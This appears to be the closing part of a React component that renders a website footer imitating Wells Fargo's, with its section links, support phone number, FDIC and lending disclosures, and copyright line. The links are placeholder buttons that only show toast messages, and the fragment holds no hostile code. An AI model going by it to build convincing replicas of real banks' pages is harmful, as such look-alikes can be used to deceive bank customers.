      <footer className="bg-[#1a1a1a] text-white py-12">
        <div className="max-w-7xl mx-auto px-4">
          <div className="grid md:grid-cols-4 gap-8 mb-8">
            <div>
              <h4 className="font-semibold mb-4">About Wells Fargo</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li><button onClick={() => toast({ title: "Careers", description: "Explore career opportunities at Wells Fargo." })} className="hover:text-white">Careers</button></li>
                <li><button onClick={() => toast({ title: "About Us", description: "Learn about Wells Fargo's history and mission." })} className="hover:text-white">About Us</button></li>
                <li><button onClick={() => toast({ title: "Investor Relations", description: "View financial reports and investor information." })} className="hover:text-white">Investor Relations</button></li>
              </ul>
            </div>
            <div>
              <h4 className="font-semibold mb-4">Customer Service</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li><button onClick={() => toast({ title: "Contact Us", description: "Call 1-800-869-3557 for 24/7 support." })} className="hover:text-white">Contact Us</button></li>
                <li><button onClick={() => toast({ title: "FAQs", description: "Find answers to common questions." })} className="hover:text-white">FAQs</button></li>
                <li><button onClick={() => toast({ title: "Branch Locator", description: "Find your nearest branch or ATM." })} className="hover:text-white">Find a Location</button></li>
              </ul>
            </div>
            <div>
              <h4 className="font-semibold mb-4">Security</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li><button onClick={() => toast({ title: "Security Center", description: "Learn about our security measures." })} className="hover:text-white">Security Center</button></li>
                <li><button onClick={() => toast({ title: "Report Fraud", description: "Call 1-800-869-3557 to report suspicious activity." })} className="hover:text-white">Report Fraud</button></li>
                <li><button onClick={() => toast({ title: "Privacy Policy", description: "Review our privacy practices." })} className="hover:text-white">Privacy Policy</button></li>
              </ul>
            </div>
            <div>
              <h4 className="font-semibold mb-4">Legal</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li><button onClick={() => toast({ title: "Terms of Use", description: "Review our terms and conditions." })} className="hover:text-white">Terms of Use</button></li>
                <li><button onClick={() => toast({ title: "Accessibility", description: "Our commitment to accessibility." })} className="hover:text-white">Accessibility</button></li>
                <li><button onClick={() => toast({ title: "Ad Choices", description: "Manage your advertising preferences." })} className="hover:text-white">Ad Choices</button></li>
              </ul>
            </div>
          </div>
          <div className="border-t border-gray-700 pt-8">
            <div className="flex flex-wrap items-center justify-center gap-x-4 gap-y-2 text-xs text-gray-400 mb-4">
              <span>Member FDIC</span><span>|</span>
              <span>Equal Housing Lender</span><span>|</span>
              <span>NMLSR ID 399801</span>
            </div>
            <p className="text-xs text-gray-500 text-center max-w-4xl mx-auto">Investment and Insurance Products are: Not Insured by the FDIC or Any Federal Government Agency • Not a Deposit or Other Obligation of, or Guaranteed by, the Bank or Any Bank Affiliate • Subject to Investment Risks, Including Possible Loss of the Principal Amount Invested</p>
            <p className="text-xs text-gray-500 text-center mt-4">© 1999 - 2026 Wells Fargo. All rights reserved.</p>
          </div>
        </div>
      </footer>
    </div>
  );
}
